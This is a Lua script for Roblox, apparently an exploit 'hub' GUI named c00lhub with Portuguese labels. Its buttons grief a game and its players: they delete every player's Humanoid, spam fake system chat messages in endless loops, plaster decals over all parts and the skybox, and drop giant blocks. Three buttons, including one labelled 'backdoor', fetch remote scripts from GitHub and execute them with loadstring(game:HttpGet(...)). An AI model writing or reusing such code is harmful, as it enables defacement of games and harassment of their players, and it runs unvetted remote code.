-- Gui to Lua
-- Version: 3.2

-- Instances:

local C00lhubV1 = Instance.new("ScreenGui")
local colorGradient = Instance.new("Frame")
local Open = Instance.new("TextButton")
local UIGradient = Instance.new("UIGradient")
local PaiDaFrame = Instance.new("Frame")
local UIGradient_2 = Instance.new("UIGradient")
local FramePrincipal = Instance.new("Frame")
local GuiInicial = Instance.new("Frame")
local inicio = Instance.new("TextLabel")
local backdoor = Instance.new("TextButton")
local blocosCaindoDoCeu = Instance.new("TextButton")
local nomeC00lkidd = Instance.new("TextButton")
local guiEmSima = Instance.new("TextButton")
local systemaDoChatAlerta = Instance.new("TextButton")
local Musica = Instance.new("TextButton")
local deletarHumanoids = Instance.new("TextButton")
local fuderComALighting = Instance.new("TextButton")
local decals = Instance.new("TextButton")
local skybox = Instance.new("TextButton")
local particulas = Instance.new("TextButton")
local loopdiaenoite = Instance.new("TextButton")
local GirarWorkspace = Instance.new("TextButton")
local btools = Instance.new("TextButton")
local InfinityYield = Instance.new("TextButton")
local fecharFrame = Instance.new("TextButton")
local c00lhub = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local c00lkidd = Instance.new("Frame")
local UIGradient_3 = Instance.new("UIGradient")
local c00lkidd_2 = Instance.new("Frame")
local Cleitinho = Instance.new("ImageLabel")
local textureID = "rbxassetid://158118263"

--Properties:

C00lhubV1.Name = "C00lhubV1"
C00lhubV1.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
C00lhubV1.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

colorGradient.Name = "colorGradient"
colorGradient.Parent = C00lhubV1
colorGradient.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
colorGradient.BackgroundTransparency = 0.4
colorGradient.BorderColor3 = Color3.fromRGB(0, 0, 0)
colorGradient.BorderSizePixel = 0
colorGradient.Position = UDim2.new(0.0332693532, 0, 0.946977735, 0)
colorGradient.Size = UDim2.new(0, 165, 0, 50)

Open.Name = "Open"
Open.Parent = colorGradient
Open.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
Open.BorderColor3 = Color3.fromRGB(255, 255, 255)
Open.Position = UDim2.new(0.0379857831, 0, 0.176322028, 0)
Open.Size = UDim2.new(0, 151, 0, 41)
Open.Font = Enum.Font.SourceSans
Open.Text = "Abrir"
Open.TextColor3 = Color3.fromRGB(255, 255, 255)
Open.TextScaled = true
Open.TextSize = 14.000
Open.TextWrapped = true
Open.MouseButton1Down:Connect(function()
	PaiDaFrame.Visible = true
end)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(0, 0, 255))}
UIGradient.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 0.00), NumberSequenceKeypoint.new(0.01, 0.34), NumberSequenceKeypoint.new(0.48, 0.78), NumberSequenceKeypoint.new(1.00, 0.42), NumberSequenceKeypoint.new(1.00, 0.00)}
UIGradient.Parent = colorGradient

PaiDaFrame.Name = "PaiDaFrame"
PaiDaFrame.Parent = C00lhubV1
PaiDaFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
PaiDaFrame.BackgroundTransparency = 0.4
PaiDaFrame.BorderColor3 = Color3.fromRGB(0, 0, 0)
PaiDaFrame.BorderSizePixel = 0
PaiDaFrame.Position = UDim2.new(0.204647481, 0, 0.158587843, 0)
PaiDaFrame.Size = UDim2.new(0, 935, 0, 645)
PaiDaFrame.Visible = false

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(126, 33, 255))}
UIGradient_2.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 0.00), NumberSequenceKeypoint.new(0.01, 0.34), NumberSequenceKeypoint.new(0.48, 0.78), NumberSequenceKeypoint.new(1.00, 0.42), NumberSequenceKeypoint.new(1.00, 0.00)}
UIGradient_2.Parent = PaiDaFrame

FramePrincipal.Name = "FramePrincipal"
FramePrincipal.Parent = PaiDaFrame
FramePrincipal.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
FramePrincipal.BorderColor3 = Color3.fromRGB(255, 255, 255)
FramePrincipal.Position = UDim2.new(0.00792353787, 0, 0.010390739, 0)
FramePrincipal.Size = UDim2.new(0, 919, 0, 631)

GuiInicial.Name = "GuiInicial"
GuiInicial.Parent = FramePrincipal
GuiInicial.BackgroundColor3 = Color3.fromRGB(90, 90, 90)
GuiInicial.BorderColor3 = Color3.fromRGB(255, 255, 255)
GuiInicial.Position = UDim2.new(0.0141458111, 0, 0.342960328, 0)
GuiInicial.Size = UDim2.new(0, 892, 0, 399)

inicio.Name = "inicio"
inicio.Parent = GuiInicial
inicio.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
inicio.BorderColor3 = Color3.fromRGB(255, 255, 255)
inicio.Position = UDim2.new(0.775784731, 0, 0, 0)
inicio.Size = UDim2.new(0, 200, 0, 50)
inicio.Text = "inicio"
inicio.TextColor3 = Color3.fromRGB(255, 255, 255)
inicio.TextScaled = true
inicio.TextSize = 14.000
inicio.TextWrapped = true

backdoor.Name = "backdoor"
backdoor.Parent = GuiInicial
backdoor.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
backdoor.BorderColor3 = Color3.fromRGB(255, 255, 255)
backdoor.Position = UDim2.new(0.0213004481, 0, 0.0401002504, 0)
backdoor.Size = UDim2.new(0, 168, 0, 55)
backdoor.Text = "backdoor"
backdoor.TextColor3 = Color3.fromRGB(255, 255, 255)
backdoor.TextScaled = true
backdoor.TextSize = 14.000
backdoor.TextWrapped = true
backdoor.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
end)

blocosCaindoDoCeu.Name = "blocosCaindoDoCeu"
blocosCaindoDoCeu.Parent = GuiInicial
blocosCaindoDoCeu.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
blocosCaindoDoCeu.BorderColor3 = Color3.fromRGB(255, 255, 255)
blocosCaindoDoCeu.Position = UDim2.new(0.0213004481, 0, 0.26566416, 0)
blocosCaindoDoCeu.Size = UDim2.new(0, 168, 0, 55)
blocosCaindoDoCeu.Text = "blocos caindo do céu"
blocosCaindoDoCeu.TextColor3 = Color3.fromRGB(255, 255, 255)
blocosCaindoDoCeu.TextScaled = true
blocosCaindoDoCeu.TextSize = 14.000
blocosCaindoDoCeu.TextWrapped = true
blocosCaindoDoCeu.MouseButton1Down:Connect(function()
	local spawnHeight = 1000  -- Altura onde os blocos aparecem
	local fallInterval = 0.5    -- Intervalo entre cada bloco cair (segundos)
	local spawnRange = 1000     -- Distância horizontal máxima para spawn
	local despawnTime = 5    -- Tempo até os blocos desaparecerem (segundos)

	function spawnBlock()
		local sizeFactor = math.random(100, 200) -- Aumenta o tamanho geral dos blocos
		local block = Instance.new("Part")  
		block.Size = Vector3.new(sizeFactor, sizeFactor, sizeFactor) -- Agora os blocos são maiores
		block.Position = Vector3.new(math.random(-spawnRange, spawnRange), spawnHeight, math.random(-spawnRange, spawnRange))
		block.Color = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255)) -- Cor aleatória
		block.Material = Enum.Material.SmoothPlastic
		block.Anchored = false  -- Deixa os blocos caírem com a gravidade
		block.CanCollide = false -- Agora os blocos atravessam tudo
		block.Parent = game.Workspace

		-- Espera 10 segundos e remove o bloco
		task.delay(despawnTime, function()
			if block then
				block:Destroy()
			end
		end)
	end

	while true do
		spawnBlock()
		wait(fallInterval)
	end
end)

nomeC00lkidd.Name = "nomeC00lkidd"
nomeC00lkidd.Parent = GuiInicial
nomeC00lkidd.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
nomeC00lkidd.BorderColor3 = Color3.fromRGB(255, 255, 255)
nomeC00lkidd.Position = UDim2.new(0.0213004481, 0, 0.501253128, 0)
nomeC00lkidd.Size = UDim2.new(0, 168, 0, 55)
nomeC00lkidd.Text = "nome: c00lkidd"
nomeC00lkidd.TextColor3 = Color3.fromRGB(255, 255, 255)
nomeC00lkidd.TextScaled = true
nomeC00lkidd.TextSize = 14.000
nomeC00lkidd.TextWrapped = true
nomeC00lkidd.MouseButton1Down:Connect(function()
	local ChatService = require(game:GetService("ServerScriptService"):WaitForChild("ChatServiceRunner"):WaitForChild("ChatService"))
	local Players = game:GetService("Players")

	local function onPlayerAdded(player)
		local speaker = nil

		-- Espera até que o Speaker do jogador seja criado
		while not speaker do
			speaker = ChatService:GetSpeaker(player.Name)
			if not speaker then
				wait(0.1)
			end
		end

		-- Adiciona a tag de chat
		speaker:SetExtraData("Tags", {
			{
				TagText = "[c00lkidd]", -- Texto da tag
				TagColor = Color3.fromRGB(255, 215, 0) -- Cor da tag (amarelo ouro)
			}
		})
	end

	-- Conectar a função ao evento de jogador entrando
	Players.PlayerAdded:Connect(onPlayerAdded)

	-- Para jogadores já conectados, adiciona a tag de chat
	for _, player in ipairs(Players:GetPlayers()) do
		onPlayerAdded(player)
	end
end)

guiEmSima.Name = "guiEmSima"
guiEmSima.Parent = GuiInicial
guiEmSima.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
guiEmSima.BorderColor3 = Color3.fromRGB(255, 255, 255)
guiEmSima.Position = UDim2.new(0.0213004481, 0, 0.724310756, 0)
guiEmSima.Size = UDim2.new(0, 168, 0, 55)
guiEmSima.Text = "pedido para entrar no time c00lkidd"
guiEmSima.TextColor3 = Color3.fromRGB(255, 255, 255)
guiEmSima.TextScaled = true
guiEmSima.TextSize = 14.000
guiEmSima.TextWrapped = true
guiEmSima.MouseButton1Down:Connect(function()
	-- Gui to Lua
	-- Version: 3.2

	-- Instances:

	local ScreenGui = Instance.new("ScreenGui")
	local TextLabel = Instance.new("TextLabel")

	--Properties:

	ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
	ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	ScreenGui.IgnoreGuiInset = true

	TextLabel.Parent = ScreenGui
	TextLabel.BackgroundColor3 = Color3.fromRGB(57, 57, 57)
	TextLabel.BackgroundTransparency = 0.300
	TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
	TextLabel.BorderSizePixel = 0
	TextLabel.Size = UDim2.new(0, 1563, 0, 22)
	TextLabel.Font = Enum.Font.SourceSans
	TextLabel.Text = "team c00lkidd join today!"
	TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
	TextLabel.TextSize = 14.000
end)

systemaDoChatAlerta.Name = "systemaDoChatAlerta"
systemaDoChatAlerta.Parent = GuiInicial
systemaDoChatAlerta.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
systemaDoChatAlerta.BorderColor3 = Color3.fromRGB(255, 255, 255)
systemaDoChatAlerta.Position = UDim2.new(0.256726444, 0, 0.724310756, 0)
systemaDoChatAlerta.Size = UDim2.new(0, 168, 0, 55)
systemaDoChatAlerta.Text = "alerta no chat"
systemaDoChatAlerta.TextColor3 = Color3.fromRGB(255, 255, 255)
systemaDoChatAlerta.TextScaled = true
systemaDoChatAlerta.TextSize = 14.000
systemaDoChatAlerta.TextWrapped = true
systemaDoChatAlerta.MouseButton1Down:Connect(function()
	local TextChatService = game:GetService("TextChatService") -- Correção do serviço
	local prefix = "[c00lkidd system] "

	local function spamMessages()
		while true do
			wait(0.1)

			-- Primeira mensagem
			local message = "team c00lkidd join today!"
			TextChatService.TextChannels.RBXGeneral:DisplaySystemMessage(prefix..message)

			wait(0.1)

			-- Segunda mensagem
			message = "team c00lkidd i'm back!"
			TextChatService.TextChannels.RBXGeneral:DisplaySystemMessage(prefix..message)
		end
	end

	-- Inicia o spam de mensagens
	spamMessages()
end)

Musica.Name = "Musica"
Musica.Parent = GuiInicial
Musica.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
Musica.BorderColor3 = Color3.fromRGB(255, 255, 255)
Musica.Position = UDim2.new(0.256726444, 0, 0.501253128, 0)
Musica.Size = UDim2.new(0, 168, 0, 55)
Musica.Text = "musica"
Musica.TextColor3 = Color3.fromRGB(255, 255, 255)
Musica.TextScaled = true
Musica.TextSize = 14.000
Musica.TextWrapped = true
Musica.MouseButton1Down:Connect(function()
	local soundId = "rbxassetid://1839246711" -- ID da música oficial
	local volume = 1 -- Volume da música

	-- Função para remover todas as músicas não autorizadas
	local function removeExistingMusic()
		for _, obj in pairs(game.Workspace:GetDescendants()) do
			if obj:IsA("Sound") and obj.SoundId ~= soundId then
				obj:Destroy()
				warn("Música não autorizada removida!")
			end
		end
	end

	-- Função para impedir que novas músicas sejam adicionadas
	local function blockNewMusic()
		game.Workspace.DescendantAdded:Connect(function(obj)
			if obj:IsA("Sound") and obj.SoundId ~= soundId then
				obj:Destroy()
				warn("Tentativa de adicionar música bloqueada!")
			end
		end)
	end

	-- Função para garantir que a música oficial esteja sempre tocando
	local function ensureMainMusic()
		local sound = game.Workspace:FindFirstChild("MainMusic")

		-- Se a música não existir, cria uma nova
		if not sound then
			sound = Instance.new("Sound")
			sound.Name = "MainMusic"
			sound.SoundId = soundId
			sound.Looped = true
			sound.Volume = volume
			sound.Parent = game.Workspace
			sound:Play()
		end

		-- Monitora a música para garantir que ela continue tocando
		game:GetService("RunService").Stepped:Connect(function()
			if not sound or not sound:IsDescendantOf(game) then
				warn("Música oficial foi removida! Restaurando...")
				ensureMainMusic()
			elseif not sound.IsPlaying then
				warn("Música foi pausada! Retomando...")
				sound:Play()
			end
		end)
	end

	-- Executa as funções de proteção
	removeExistingMusic()
	blockNewMusic()
	ensureMainMusic()

	print("Proteção de música ativada! Hackers não poderão trocar a música.")
end)

deletarHumanoids.Name = "deletarHumanoids"
deletarHumanoids.Parent = GuiInicial
deletarHumanoids.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
deletarHumanoids.BorderColor3 = Color3.fromRGB(255, 255, 255)
deletarHumanoids.Position = UDim2.new(0.256726444, 0, 0.26566416, 0)
deletarHumanoids.Size = UDim2.new(0, 168, 0, 55)
deletarHumanoids.Text = "deletar humanoid"
deletarHumanoids.TextColor3 = Color3.fromRGB(255, 255, 255)
deletarHumanoids.TextScaled = true
deletarHumanoids.TextSize = 14.000
deletarHumanoids.TextWrapped = true
deletarHumanoids.MouseButton1Down:Connect(function()
	local Players = game:GetService("Players")

	-- Função para remover o Humanoid de todos os jogadores
	local function removeHumanoid()
		for _, player in pairs(Players:GetPlayers()) do
			-- Verifica se o jogador tem um personagem e se o personagem possui um Humanoid
			if player.Character and player.Character:FindFirstChild("Humanoid") then
				local humanoid = player.Character:FindFirstChild("Humanoid")
				humanoid:Destroy() -- Deleta o Humanoid
			end
		end
	end

	-- Chama a função para remover o Humanoid de todos os jogadores
	removeHumanoid()

	-- Conecta a função ao evento PlayerAdded para garantir que os novos jogadores também tenham o Humanoid removido
	Players.PlayerAdded:Connect(function(player)
		player.CharacterAdded:Connect(function(character)
			-- Aguarda o personagem carregar e depois remove o Humanoid
			if character:FindFirstChild("Humanoid") then
				character:FindFirstChild("Humanoid"):Destroy()
			end
		end)
	end)
end)

fuderComALighting.Name = "fuderComALighting"
fuderComALighting.Parent = GuiInicial
fuderComALighting.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
fuderComALighting.BorderColor3 = Color3.fromRGB(255, 255, 255)
fuderComALighting.Position = UDim2.new(0.256726444, 0, 0.0401002504, 0)
fuderComALighting.Size = UDim2.new(0, 168, 0, 55)
fuderComALighting.Text = "fuder com a lighting"
fuderComALighting.TextColor3 = Color3.fromRGB(255, 255, 255)
fuderComALighting.TextScaled = true
fuderComALighting.TextSize = 14.000
fuderComALighting.TextWrapped = true
fuderComALighting.MouseButton1Down:Connect(function()
	local Lighting = game:GetService("Lighting")

	-- Função para simular a visão daltônica
	local function setDaltonicMode()
		-- Criando o efeito de ColorCorrection
		local colorCorrection = Instance.new("ColorCorrectionEffect")
		local colorCorrection2 = Instance.new("ColorCorrectionEffect")
		colorCorrection.Enabled = true

		-- Alterando as cores para simular um tipo de daltonismo
		-- Essa combinação é apenas um exemplo e pode ser ajustada conforme necessário
		colorCorrection.TintColor = Color3.fromRGB(255, 0, 0) -- Colocando um tom amarelado
		colorCorrection.Saturation = -0.7  -- Reduzindo bastante a saturação para uma visão mais apagada
		colorCorrection.Contrast =  100000002004087734272    -- Aumentando o contraste para intensificar a diferença nas cores
		colorCorrection.Brightness = 0.1   -- Aumentando o brilho para deixar a cena mais iluminada
		colorCorrection2.TintColor = Color3.fromRGB(255, 0, 4) -- Colocando um tom amarelado
		colorCorrection2.Saturation = -0.1  -- Reduzindo bastante a saturação para uma visão mais apagada
		colorCorrection2.Contrast =  100000002004087734272    -- Aumentando o contraste para intensificar a diferença nas cores
		colorCorrection2.Brightness = 0.1 

		-- Aplica o efeito de daltonismo no serviço de iluminação
		colorCorrection.Parent = Lighting
		colorCorrection2.Parent = Lighting
	end

	-- Chamando as funções
	setDaltonicMode()
end)

decals.Name = "decals"
decals.Parent = GuiInicial
decals.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
decals.BorderColor3 = Color3.fromRGB(255, 255, 255)
decals.Position = UDim2.new(0.492152452, 0, 0.0401002504, 0)
decals.Size = UDim2.new(0, 168, 0, 55)
decals.Text = "decals"
decals.TextColor3 = Color3.fromRGB(255, 255, 255)
decals.TextScaled = true
decals.TextSize = 14.000
decals.TextWrapped = true
decals.MouseButton1Down:Connect(function()
	local workspace = game:GetService("Workspace")

	-- 🟢 Função para adicionar Decals em todas as faces de um objeto
	local function applyDecalsToObject(object)
		-- Apenas adiciona Decals se for uma Part e não tiver Decals ainda
		if object:IsA("Part") or object:IsA("MeshPart") then
			for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
				-- Verifica se já existe um Decal na face antes de adicionar
				local hasDecal = false
				for _, child in ipairs(object:GetChildren()) do
					if child:IsA("Decal") and child.Face == face then
						hasDecal = true
						break
					end
				end

				-- Se não tiver Decal na face, adiciona
				if not hasDecal then
					local decal = Instance.new("Decal")
					decal.Texture = textureID
					decal.Face = face
					decal.Parent = object
				end
			end
		end
	end

	-- 🟢 Aplica decals a todas as Parts já existentes no Workspace
	for _, obj in pairs(workspace:GetDescendants()) do
		applyDecalsToObject(obj)
	end

	-- 🟢 Aplica decals a qualquer nova Part adicionada no Workspace
	workspace.DescendantAdded:Connect(function(obj)
		applyDecalsToObject(obj)
	end)
end)

skybox.Name = "skybox"
skybox.Parent = GuiInicial
skybox.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
skybox.BorderColor3 = Color3.fromRGB(255, 255, 255)
skybox.Position = UDim2.new(0.492152452, 0, 0.26566416, 0)
skybox.Size = UDim2.new(0, 168, 0, 55)
skybox.Text = "skybox"
skybox.TextColor3 = Color3.fromRGB(255, 255, 255)
skybox.TextScaled = true
skybox.TextSize = 14.000
skybox.TextWrapped = true
skybox.MouseButton1Down:Connect(function()
	local lighting = game:GetService("Lighting")

	local function changeSkyboxTexture()
		local skybox = lighting:FindFirstChildOfClass("Sky")

		if not skybox then
			skybox = Instance.new("Sky")
			skybox.Name = "CustomSkybox"
			skybox.Parent = lighting
		end

		-- Aplica a textura em todas as direções da Skybox
		for _, property in pairs({ "SkyboxBk", "SkyboxDn", "SkyboxFt", "SkyboxLf", "SkyboxRt", "SkyboxUp" }) do
			skybox[property] = textureID
			skybox:GetPropertyChangedSignal(property):Connect(function()
				skybox[property] = textureID
			end)
		end
	end

	changeSkyboxTexture()
end)

particulas.Name = "particulas"
particulas.Parent = GuiInicial
particulas.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
particulas.BorderColor3 = Color3.fromRGB(255, 255, 255)
particulas.Position = UDim2.new(0.492152452, 0, 0.501253128, 0)
particulas.Size = UDim2.new(0, 168, 0, 55)
particulas.Text = "particulas"
particulas.TextColor3 = Color3.fromRGB(255, 255, 255)
particulas.TextScaled = true
particulas.TextSize = 14.000
particulas.TextWrapped = true
particulas.MouseButton1Down:Connect(function()
	local function addParticlesToPart(part)
		-- Verifica se a peça já tem um Attachment para evitar duplicação
		local attachment = part:FindFirstChild("ParticleAttachment")
		if not attachment then
			attachment = Instance.new("Attachment")
			attachment.Name = "ParticleAttachment"
			attachment.Parent = part
		end

		-- Verifica se a peça já tem um ParticleEmitter para evitar duplicação
		if not attachment:FindFirstChild("ParticleEmitter") then
			local particle = Instance.new("ParticleEmitter")
			particle.Texture = "rbxassetid://178993746" -- ID da textura da partícula (substitua se quiser)
			particle.Rate = 10 -- Quantidade de partículas emitidas por segundo
			particle.Lifetime = NumberRange.new(1, 2) -- Tempo de vida das partículas
			particle.Speed = NumberRange.new(2, 5) -- Velocidade das partículas
			particle.Parent = attachment -- Adiciona o emissor ao Attachment
			particle.Enabled = true
		end
	end

	-- Percorre todos os objetos no jogo e adiciona partículas às Parts
	for _, obj in pairs(workspace:GetDescendants()) do
		if obj:IsA("Part") then
			addParticlesToPart(obj)
		end
	end

	print("ParticleEmitter adicionado a todas as Parts!")
end)

loopdiaenoite.Name = "loopdiaenoite"
loopdiaenoite.Parent = GuiInicial
loopdiaenoite.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
loopdiaenoite.BorderColor3 = Color3.fromRGB(255, 255, 255)
loopdiaenoite.Position = UDim2.new(0.492152452, 0, 0.724310756, 0)
loopdiaenoite.Size = UDim2.new(0, 168, 0, 55)
loopdiaenoite.Text = "dia e noite"
loopdiaenoite.TextColor3 = Color3.fromRGB(255, 255, 255)
loopdiaenoite.TextScaled = true
loopdiaenoite.TextSize = 14.000
loopdiaenoite.TextWrapped = true
loopdiaenoite.MouseButton1Down:Connect(function()
	local Lighting = game:GetService("Lighting")

	-- Função para alternar entre dia e noite com transição rápida
	local function dayNightCycle()
		while true do
			-- Definir a hora para o dia (6 AM)
			Lighting:SetMinutesAfterMidnight(360) -- 6 AM
			wait(1) -- Aguarda 1 segundo no dia

			-- Transição do dia para a noite (6 PM)
			for minute = 360, 1080 do
				Lighting:SetMinutesAfterMidnight(minute)
				wait(1 / 720) -- Transição de 720 minutos em 1 segundo
			end

			wait(1) -- Aguarda 1 segundo na noite

			-- Transição da noite para o dia (6 AM)
			for minute = 1080, 360, -1 do
				Lighting:SetMinutesAfterMidnight(minute)
				wait(1 / 720) -- Transição de 720 minutos em 1 segundo
			end

			wait(1) -- Aguarda 1 segundo no início do novo ciclo
		end
	end

	-- Inicia o ciclo de dia e noite
	dayNightCycle()
end)

GirarWorkspace.Name = "GirarWorkspace"
GirarWorkspace.Parent = GuiInicial
GirarWorkspace.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
GirarWorkspace.BorderColor3 = Color3.fromRGB(255, 255, 255)
GirarWorkspace.Position = UDim2.new(0.729820609, 0, 0.724310756, 0)
GirarWorkspace.Size = UDim2.new(0, 168, 0, 55)
GirarWorkspace.Text = "Girar o workspace"
GirarWorkspace.TextColor3 = Color3.fromRGB(255, 255, 255)
GirarWorkspace.TextScaled = true
GirarWorkspace.TextSize = 14.000
GirarWorkspace.TextWrapped = true
GirarWorkspace.MouseButton1Down:Connect(function()
	-- Script para girar todas as partes e modelos na diagonal, exceto os modelos com Humanoid

	-- Definir a velocidade de rotação para os eixos X e Y (ajuste conforme necessário)
	local velocidadeRotacao = 5  -- Velocidade de rotação

	-- Função para girar as partes e modelos na diagonal
	local function girarPartesEModelsNaDiagonal()
		while true do
			for _, objeto in ipairs(workspace:GetChildren()) do
				-- Verificar se o objeto é um modelo
				if objeto:IsA("Model") then
					-- Verifica se o modelo tem um Humanoid
					local humanoide = objeto:FindFirstChildOfClass("Humanoid")
					if not humanoide then
						-- Se não tiver Humanoid, gira todas as partes dentro do modelo
						for _, parte in ipairs(objeto:GetChildren()) do
							if parte:IsA("BasePart") then
								parte.CFrame = parte.CFrame * CFrame.Angles(math.rad(velocidadeRotacao), math.rad(velocidadeRotacao), 0)
							end
						end
					end
				elseif objeto:IsA("BasePart") then
					-- Se for uma parte simples, apenas girar ela
					objeto.CFrame = objeto.CFrame * CFrame.Angles(math.rad(velocidadeRotacao), math.rad(velocidadeRotacao), 0)
				end
			end
			wait(0.03) -- Controle de tempo para a rotação
		end
	end

	-- Iniciar a rotação das partes e modelos na diagonal
	girarPartesEModelsNaDiagonal()
end)

btools.Name = "btools"
btools.Parent = GuiInicial
btools.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
btools.BorderColor3 = Color3.fromRGB(255, 255, 255)
btools.Position = UDim2.new(0.729820609, 0, 0.501253128, 0)
btools.Size = UDim2.new(0, 168, 0, 55)
btools.Text = "Btools"
btools.TextColor3 = Color3.fromRGB(255, 255, 255)
btools.TextScaled = true
btools.TextSize = 14.000
btools.TextWrapped = true
btools.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/MarbleMakerMaster/AdvancedBToolsSource/main/adv_btools.lua"))()
end)

InfinityYield.Name = "InfinityYield"
InfinityYield.Parent = GuiInicial
InfinityYield.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
InfinityYield.BorderColor3 = Color3.fromRGB(255, 255, 255)
InfinityYield.Position = UDim2.new(0.729820609, 0, 0.26566416, 0)
InfinityYield.Size = UDim2.new(0, 168, 0, 55)
InfinityYield.Text = "Infinity Yield"
InfinityYield.TextColor3 = Color3.fromRGB(255, 255, 255)
InfinityYield.TextScaled = true
InfinityYield.TextSize = 14.000
InfinityYield.TextWrapped = true
InfinityYield.MouseButton1Down:Connect(function()
	loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
end)

fecharFrame.Name = "fecharFrame"
fecharFrame.Parent = FramePrincipal
fecharFrame.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
fecharFrame.BorderColor3 = Color3.fromRGB(255, 255, 255)
fecharFrame.Position = UDim2.new(0.898803055, 0, 0.0269413628, 0)
fecharFrame.Size = UDim2.new(0, 79, 0, 58)
fecharFrame.Text = "X"
fecharFrame.TextColor3 = Color3.fromRGB(255, 255, 255)
fecharFrame.TextScaled = true
fecharFrame.TextSize = 14.000
fecharFrame.TextWrapped = true
fecharFrame.MouseButton1Down:Connect(function()
	PaiDaFrame.Visible = false
end)

c00lhub.Name = "c00lhub"
c00lhub.Parent = FramePrincipal
c00lhub.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
c00lhub.BorderColor3 = Color3.fromRGB(255, 255, 255)
c00lhub.Position = UDim2.new(0.183895543, 0, 0.00950871594, 0)
c00lhub.Size = UDim2.new(0, 410, 0, 90)

TextLabel.Parent = c00lhub
TextLabel.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0196183361, 0, 0.257052273, 0)
TextLabel.Size = UDim2.new(0, 219, 0, 56)
TextLabel.Font = Enum.Font.Unknown
TextLabel.Text = "c00lhub"
TextLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)
TextLabel.TextWrapped = true
TextLabel.FontFace = Font.new("rbxasset://12187375716/Finger-Paint?pageNumber=2&pagePosition=4", Enum.FontWeight.Bold, Enum.FontStyle.Normal)

TextLabel_2.Parent = c00lhub
TextLabel_2.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(0.325090945, 0, -0.0682690069, 0)
TextLabel_2.Size = UDim2.new(0, 268, 0, 56)
TextLabel_2.Font = Enum.Font.Unknown
TextLabel_2.Text = "made by enthony_50388"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 100.000
TextLabel_2.TextStrokeColor3 = Color3.fromRGB(255, 0, 0)
TextLabel_2.TextWrapped = true
TextLabel_2.FontFace = Font.new("rbxasset://12187375716/Finger-Paint?pageNumber=2&pagePosition=4", Enum.FontWeight.Bold, Enum.FontStyle.Normal)

c00lkidd.Name = "c00lkidd"
c00lkidd.Parent = FramePrincipal
c00lkidd.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
c00lkidd.BackgroundTransparency = 0.5
c00lkidd.BorderColor3 = Color3.fromRGB(0, 0, 0)
c00lkidd.BorderSizePixel = 0
c00lkidd.Position = UDim2.new(-0.0326441787, 0, -0.0348652937, 0)
c00lkidd.Size = UDim2.new(0, 171, 0, 160)

UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 0, 4)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(126, 33, 255))}
UIGradient_3.Transparency = NumberSequence.new{NumberSequenceKeypoint.new(0.00, 0.00), NumberSequenceKeypoint.new(0.01, 0.34), NumberSequenceKeypoint.new(0.48, 0.78), NumberSequenceKeypoint.new(1.00, 0.42), NumberSequenceKeypoint.new(1.00, 0.00)}
UIGradient_3.Parent = c00lkidd

c00lkidd_2.Name = "c00lkidd:)"
c00lkidd_2.Parent = c00lkidd
c00lkidd_2.BackgroundColor3 = Color3.fromRGB(49, 49, 49)
c00lkidd_2.BorderColor3 = Color3.fromRGB(255, 255, 255)
c00lkidd_2.Position = UDim2.new(0.0403884985, 0, 0.040312957, 0)
c00lkidd_2.Size = UDim2.new(0, 157, 0, 145)

Cleitinho.Name = "Cleitinho"
Cleitinho.Parent = c00lkidd_2
